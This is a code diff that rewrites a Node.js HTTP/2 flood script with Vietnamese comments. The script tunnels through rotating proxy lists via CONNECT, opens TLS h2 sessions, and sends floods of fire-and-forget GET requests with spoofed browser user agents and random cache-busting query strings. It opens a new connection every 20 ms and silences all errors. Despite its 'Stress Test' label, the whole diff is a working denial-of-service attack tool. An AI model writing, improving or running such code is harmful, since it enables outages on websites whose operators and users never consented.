@@ -7,169 +7,145 @@ const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');
 
-const errorHandler = error => {};
-process.on("uncaughtException", errorHandler);
-process.on("unhandledRejection", errorHandler);
-
-process.setMaxListeners(0);
+// Tắt giới hạn Event Emitter để tránh memory leak warning
 require("events").EventEmitter.defaultMaxListeners = 0;
 
+// Bỏ qua lỗi để giữ tiến trình chạy liên tục
+process.on('uncaughtException', function(er) { 
+    // console.error(er); // Tắt log lỗi để tiết kiệm I/O
+});
+process.on('unhandledRejection', function(er) { 
+});
+
 if (process.argv.length < 7) {
-    console.log(`\nUsage: node d.cjs [target] [time] [rate] [thread] [proxyfile]\n`);
+    console.log(`\nUsage: node d.cjs [target] [time] [rate] [thread] [proxyfile]\n`.red);
     process.exit();
 }
 
-function readLines(filePath) {
-    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
-}
-
-function randomIntn(min, max) {
-    return Math.floor(Math.random() * (max - min) + min);
-}
-
-function randomElement(elements) {
-    return elements[randomIntn(0, elements.length)];
-}
-
-function randstr(length) {
-    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    let result = "";
-    for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length));
-    }
-    return result;
-}
-
+// Cấu hình tham số
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
-    proxyFile: process.argv[6],
+    proxyFile: process.argv[6]
 };
 
-// Cấu hình Header và Fingerprint
-const uap = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
-];
-const platform = ['Linux', 'macOS', 'Windows'];
-const jalist = ["002205d0f96c37c5e660b9f041363c1", "073eede15b2a5a0302d823ecbd5ad15b"];
-
-const proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
+
+// Load Proxy vào RAM (3TB RAM thoải mái chứa cả tỷ proxy)
+const proxies = fs.readFileSync(args.proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(x => x !== "");
+
+// Các header giả mạo tĩnh để giảm tính toán CPU
+const UAs = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+];
+
+// Hàm random nhanh
+const randomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
+const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
 
 if (cluster.isMaster) {
     console.clear();
-    console.log(`--------------------------------------------`.gray);
-    console.log(`Target: `.brightYellow + args.target);
-    console.log(`Time:   `.brightYellow + args.time + "s");
-    console.log(`Rate:   `.brightYellow + args.Rate + " r/s");
-    console.log(`Thread: `.brightYellow + args.threads);
-    console.log(`--------------------------------------------`.gray);
-    
-    for (let counter = 1; counter <= args.threads; counter++) {
+    console.log(`================================================================`.brightRed);
+    console.log(` TARGET   : ${args.target}`.yellow);
+    console.log(` CARD MẠNG: 30 Gbps Optimization`.brightGreen);
+    console.log(` THREADS  : ${args.threads}`.yellow);
+    console.log(` MODE     : HTTP/2 FLOOD (NO RESPONSE WAIT)`.brightCyan);
+    console.log(`================================================================`.brightRed);
+
+    for (let i = 0; i < args.threads; i++) {
         cluster.fork();
     }
 
     setTimeout(() => {
-        console.log("\n[!] Test completed.".brightGreen);
-        process.exit(1);
+        console.log(`\n[!] Đã hoàn thành Stress Test.`.green);
+        process.exit(0);
     }, args.time * 1000);
 
 } else {
-    setInterval(runFlooder, 1000); 
+    // Worker Process
+    startFlood();
 }
 
-class NetSocket {
-    HTTP(options, callback) {
-        const connection = net.connect({
-            host: options.host,
-            port: options.port
+function startFlood() {
+    // Tốc độ xoay vòng proxy cực nhanh
+    setInterval(() => {
+        const proxy = randomElement(proxies);
+        const [pHost, pPort] = proxy.split(":");
+        
+        // Tạo Tunnel Socket
+        const socket = net.connect(Number(pPort), pHost, () => {
+            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
         });
 
-        connection.setTimeout(options.timeout * 1000);
-        connection.setKeepAlive(true, 10000);
+        socket.setTimeout(10000);
+        socket.setKeepAlive(true, 100000);
 
-        connection.on("connect", () => {
-            const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
-            connection.write(payload);
-        });
+        socket.once('data', (chunk) => {
+            // Nếu kết nối Proxy thành công (HTTP 200)
+            if (chunk.toString().includes("200")) {
+                const tlsConn = tls.connect({
+                    socket: socket,
+                    servername: parsedTarget.host,
+                    rejectUnauthorized: false,
+                    ALPNProtocols: ['h2'],
+                    // Ciphers nhẹ để tối ưu tốc độ mã hóa cho card 30Gbps
+                    ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256", 
+                    secure: true,
+                }, () => {
+                    if (!tlsConn.alpnProtocol || tlsConn.alpnProtocol !== 'h2') {
+                        tlsConn.destroy();
+                        return;
+                    }
 
-        connection.on("data", chunk => {
-            if (chunk.toString().includes("HTTP/1.1 200")) {
-                callback(connection, undefined);
+                    const client = http2.connect(parsedTarget.href, {
+                        createConnection: () => tlsConn,
+                        settings: {
+                            initialWindowSize: 6291456,   // Tối ưu window size cho băng thông lớn
+                            maxConcurrentStreams: 1000,   // Mở tối đa stream
+                            enablePush: false
+                        }
+                    });
+
+                    client.on('error', () => { client.destroy(); });
+                    
+                    // Kỹ thuật Flood: Không chờ delay, spam liên tục vào session đã mở
+                    const requestLoop = setInterval(() => {
+                        if (client.destroyed || client.closed) {
+                            clearInterval(requestLoop);
+                            return;
+                        }
+
+                        for (let i = 0; i < args.Rate; i++) {
+                            // Gửi request kiểu Fire-and-Forget (Bắn và Quên)
+                            // Không đăng ký sự kiện .on('response') để tiết kiệm CPU
+                            const req = client.request({
+                                ":method": "GET",
+                                ":path": parsedTarget.path + "?Build=" + Math.random().toString(36).substring(2),
+                                ":authority": parsedTarget.host,
+                                ":scheme": "https",
+                                "user-agent": randomElement(UAs),
+                                "accept": "*/*",
+                                "accept-encoding": "gzip, deflate, br",
+                                "cache-control": "no-cache"
+                            });
+                            
+                            req.end(); // Kết thúc request ngay lập tức để đẩy vào đường truyền
+                        }
+                    }, 50); // Interval cực ngắn để duy trì áp lực
+                });
+
+                tlsConn.on('error', () => { tlsConn.destroy(); socket.destroy(); });
+                tlsConn.on('end', () => { tlsConn.destroy(); });
             } else {
-                connection.destroy();
+                socket.destroy();
             }
         });
 
-        connection.on("error", () => {
-            connection.destroy();
-        });
-    }
-}
+        socket.on('error', () => { socket.destroy(); });
 
-const Socker = new NetSocket();
-
-function runFlooder() {
-    const proxyAddr = randomElement(proxies);
-    const [proxyHost, proxyPort] = proxyAddr.split(":");
-
-    const proxyOptions = {
-        host: proxyHost,
-        port: parseInt(proxyPort),
-        address: parsedTarget.host,
-        timeout: 10,
-    };
-
-    Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) return;
-
-        const tlsOptions = {
-            socket: connection,
-            servername: parsedTarget.host,
-            ALPNProtocols: ['h2', 'http/1.1'],
-            rejectUnauthorized: false,
-            ciphers: "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
-        };
-
-        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions, () => {
-            const client = http2.connect(parsedTarget.href, {
-                createConnection: () => tlsConn,
-                settings: {
-                    maxConcurrentStreams: 100,
-                    initialWindowSize: 65535,
-                }
-            });
-
-            client.on("connect", () => {
-                const attackInterval = setInterval(() => {
-                    for (let i = 0; i < args.Rate; i++) {
-                        const reqHeaders = {
-                            ":method": "GET",
-                            ":authority": parsedTarget.host,
-                            ":path": parsedTarget.path + "?" + randstr(5) + "=" + randstr(20),
-                            ":scheme": "https",
-                            "user-agent": randomElement(uap),
-                            "accept": "*/*",
-                            "ja3": randomElement(jalist),
-                            "sec-ch-ua-platform": randomElement(platform)
-                        };
-                        const request = client.request(reqHeaders);
-                        request.on("response", () => {
-                            request.close();
-                            request.destroy();
-                        });
-                        request.end();
-                    }
-                }, 1000);
-            });
-
-            client.on("error", () => {
-                client.destroy();
-                connection.destroy();
-            });
-        });
-    });
+    }, 20); // Tạo kết nối mới mỗi 20ms
 }
